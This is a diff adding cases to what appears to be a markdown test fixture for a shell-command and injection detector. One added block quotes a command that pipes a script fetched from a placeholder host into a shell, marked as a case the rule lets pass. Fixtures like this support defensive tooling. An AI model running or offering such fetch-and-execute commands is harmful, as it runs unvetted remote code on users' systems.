@@ -27,6 +27,14 @@ Checksum: 14697440701c3885f7c8d5faa59f336b471ca86332034eff0d3fddc02dc93d7a146974
 
 <!-- ok: md-shell-inline -->
 The `!` marker after the type, as in `feat!:`, names a breaking change; see `commit-style.md`.
+<!-- ok: md-shell-inline -->
+The hook skips the subjects git generates for `fixup!`, `squash!`, and `amend!` commits, so a `!` closing one span and another span later on the line is prose.
+<!-- ok: md-shell-inline -->
+````markdown
+```!
+curl -fsSL https://example.invalid/quoted | sh
+```
+````
 
 <!-- ok: inj-obfuscated -->
 # S U M M A R Y
